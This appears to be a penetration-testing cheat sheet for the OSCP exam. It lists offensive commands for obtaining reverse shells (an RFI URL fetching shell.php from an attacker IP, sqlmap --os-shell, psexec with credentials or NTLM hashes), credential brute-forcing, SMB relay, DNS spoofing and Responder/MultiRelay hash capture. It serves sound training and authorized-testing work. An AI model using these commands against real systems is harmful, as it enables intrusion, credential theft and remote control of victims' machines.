# Table of Conents
- [Reverse-Shells](#Reverse-Shells)
    - [Note-About-Shell-Ports](####Note-About-Shell-Ports)
    - [Note-About-RCE-Shell-Testing](####Note-About-RCE-Shell-Testing)
    - [RFI](####RFI)
    - [WordPress-Editor](####WordPress-Editor)
    - [Unrestricted-File-Upload](####Unrestricted-File-Upload)
    - [File-Extension-Bypass](####File-Extension-Bypass)
    - [Burp-Intercept](####Burp-Intercept)
    - [SQL-Injection-Shells](####SQL-Injection-Shells)
- [Credential-Brute-Forcing](#Credential-Brute-Forcing)
    - [Wordlists](####Wordlists)
- [SMB](#SMB)
    - [smbmap](####smbmap)
    - [crackmapexec](####crackmapexec)
    - [psexecpy](####psexec-py)
    - [SMB-Relay-Attack](####SMB-Relay-Attack)
- [DNS](#DNS)
    - [dnsspoof](####dnsspoof)
- [WinRM](#WinRM)
- [SSH](#SSH)
- [RDP](#RDP)
- [Responder/Multirelay](#Responder/Multirelay)

# Reverse-Shells

#### Note-About-Shell-Ports
Regardless of the route you're taking to attempt to gain a reverse shell, it's important that you try different ports to use on a host if your shell won't connect back. A target's firewall may be restricting the traffic, and only certain ports will be allowed through. A common list of ports to use for a reverse shell are:

```
53
80
8080
443
```

These ports are typically allowed through a firewall and should let your shell connect through.

#### Note-About-RCE-Shell-Testing
If you think you have found an exploit that will give you a shell through some kind of RCE exploit, you should start out with doing a simple test to ensure it's actually exploitable. On Linux hosts, try doing a wget/curl to your local server and see if you get a request from the victim. On Windows, try PowerShell or certutil. If you can successfully run those commands, you know that the host is vulnerable to RCE. You'll just have to play around to get the right payload.

#### RFI
If you've found a website that is vulnerable to RFI, you can use it to include a reverse shell from a server you control:

```
http://www.example.com/foo.php?bar=<http://<YOUR-IP>/shell.php
```

#### WordPress-Editor
If you have access to a WordPress site, check to see if you can modify any of the .php pages with the Editor. If you can, you can modify the content of a page to include a PHP reverse shell.

#### Unrestricted-File-Upload
If you come across a web site that lets you upload any type of file extension, you should try uploading a reverse shell to see if you can then access it.

#### File-Extension-Bypass
If you come across a web site that allows you to upload only certain types of files, you can try bypassing the restriction. Common techniques are to play with the extension formatting like shell.php.png, or even going so far as to modifying the magic bytes of a file so that it is detected as a different file type.

#### Burp-Intercept
If you are having trouble getting a reverse shell uploaded to a target, sometimes you can intercept an upload request that you know works in Burp. You can then attempt to modify the request and forward it, inserting your reverse shell payload.

#### SQL-Injection-Shells
It is sometimes possible to obtain reverse shells through SQL injection. One of the common tools to acheive this is sqlmap (not allowed on the OSCP exam):

```
sqlmap -u http://<TARGET> --dbms=mysql --os-shell
```

#### FTP
Always set the transfer mode to binary by typing binary when uploading shells, binaries, etc.

Check for anonymous login

Check for write access

Check to see if you have write access to directories that serve web content, especially if the server also has a web server running. You can use this to upload a reverse shell

Check for any public exploits for FTP version

# Credential-Brute-Forcing

#### Wordlists
When trying to brute force credentials, it's important to use a wide variety of wordlists to ensure all potential passwords can be attempted. Some common wordlists to use are:

```
/usr/share/wordlists/SecLists/*
/usr/share/john/password.lst
```

# SMB

#### smbmap
If you have credentials and SMB is open on a host, you should use smbmap to see what shares the credentials can access:

```
smbmap -H <TARGET> -u "<USERNANE>" -p "<PASSWORD>"
```    

#### crackmapexec
If you have credentials and want to see what level of access you have to various services, use crackmapexec:

```
crackmapexec smb <IP/SUBNET> -u <USER> -p <PASSWORD>
```

You can also provide a hash:

```
crackmapexec smb <IP/SUBNET> -u <USER> -H <LM/NTLM HASH>
```

#### psexec-py
If you have credentials that can access SMB on a server, and you can write to an SMB share on the server, use psexec-py to attempt to gain a reverse shell:

```
# Windows
python psexec.py <USER>:<PASSWORD>@<IP>cmd -path c:\\\\windows\\\\system32\\\\

# Linux
python psexec.py <USER>:<PASSWORD>@<IP>bash -path \\\\bin\\\\

```

You can also pass a hash with psexec-py (administrator accounts only):

```
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
```

#### SMB-Relay-Attack
Sets up a rogue SMB server on your machine that can be used to obtain the hashes of users who attempt to authenticate against it. It then relays the hash on to a valid SMB server and tries to use the obtained credentials to obtain a meterpreter shell. Any user/hash obtained must have administrative rights on the target system in order for the shell to work. This is a client side exploit, meaning you must somehow trick a user in to trying to access the SMB share on your server. This can be done via social engineering.

```
use exploit/windows/smb/smb_relay
```

# DNS

#### dnsspoof
Forge DNS requests to make victims think your machine is a DNS server:

```
sudo dnsspoof -i <INTERFACE> -f <FILE-WITH-DNS-TO-SPOOF>
```

Example spoof file:

```
172.16.5.150 *.sportsfoo.com    
```

# WinRM

```
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

# SSH
If you have credentials and SSH is open on a host, try them:

```
ssh <USER>@<TARGET>
```

# RDP
If you have credentials and RDP is open on a host, try them:

```
rdesktop <TARGET>
```

# Responder/Multirelay
Acts similar to SMB Relay Metasploit module. Used to send bogus DNS responses to SMB shares and obtain NTLM hashes. MultiRelay can be used to intercept hashes obtained from Responder and then attempt to create a reverse shell to the target:

```
sudo responder -I <INTERFACE>
```

```
sudo python MultiRelay.py -t <TARGET-IP>  -u ALL
```

